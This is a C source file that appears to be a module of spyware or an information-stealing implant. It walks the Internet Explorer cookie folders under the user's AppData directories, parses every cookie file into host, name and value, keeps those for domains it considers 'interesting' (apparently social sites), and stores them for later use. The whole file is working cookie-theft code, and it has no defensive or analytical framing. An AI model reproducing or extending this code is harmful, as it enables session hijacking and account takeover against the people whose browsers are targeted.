#include <Windows.h>
#include <Shlobj.h>
#include <stdio.h>

#include "globals.h"
#include "zmem.h"
#include "utils.h"
#include "social.h"
#include "cookies.h"
#include "ie_cookies.h"

VOID ParseIECookie(LPWSTR strFileName)
{
	LPSTR strHost, strName, strValue;
	LPSTR strCookie = (LPSTR) MapFile(strFileName, FILE_SHARE_READ);

	if (!strCookie)
		return;

	LPSTR strTemp = strCookie;
	for (;;)
	{
		strName = strTemp;
		if (!(strTemp = strchr(strTemp, '\n')))
			break;
		*strTemp++ = 0;
		strValue = strTemp;

		if (!(strTemp = strchr(strTemp, '\n')))
			break;
		*strTemp++ = 0;
		strHost = strTemp;

		if (!(strTemp = strchr(strTemp, '\n')))
			break;
		*strTemp++ = 0;

		if (!(strTemp = strstr(strTemp, "*\n")))
			break;
		strTemp += 2;

		NormalizeDomainA(strHost);
		if (IsInterestingDomainA(strHost))
			AddCookieA(strHost, strName, strValue);
	}

	zfree(strCookie);
}

VOID DumpIECookies(LPWSTR strCookiePath, BOOL bLocal)
{
	LPWSTR strAppData = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
	if (!SHGetSpecialFolderPath(NULL, strAppData, bLocal ? CSIDL_LOCAL_APPDATA : CSIDL_APPDATA, FALSE))
	{
		zfree(strAppData);
		return;
	}
	
	LPWSTR strCookieSearch = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
	_snwprintf_s(strCookieSearch, MAX_FILE_PATH, MAX_FILE_PATH*sizeof(WCHAR), L"%s\\%s\\*", strAppData, strCookiePath);
		
	WIN32_FIND_DATA pFindData;
	HANDLE hFind = FindFirstFile(strCookieSearch, &pFindData);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				continue;

			LPWSTR strFileName = (LPWSTR) zalloc(MAX_FILE_PATH * sizeof(WCHAR));
			_snwprintf_s(strFileName, MAX_FILE_PATH, MAX_FILE_PATH*sizeof(WCHAR), L"%s\\%s\\%s", strAppData, strCookiePath, pFindData.cFileName);
			
			ParseIECookie(strFileName);

			zfree(strFileName);
		}
		while (FindNextFile(hFind, &pFindData));

		FindClose(hFind);
	}

	zfree(strCookieSearch);
	zfree(strAppData);
}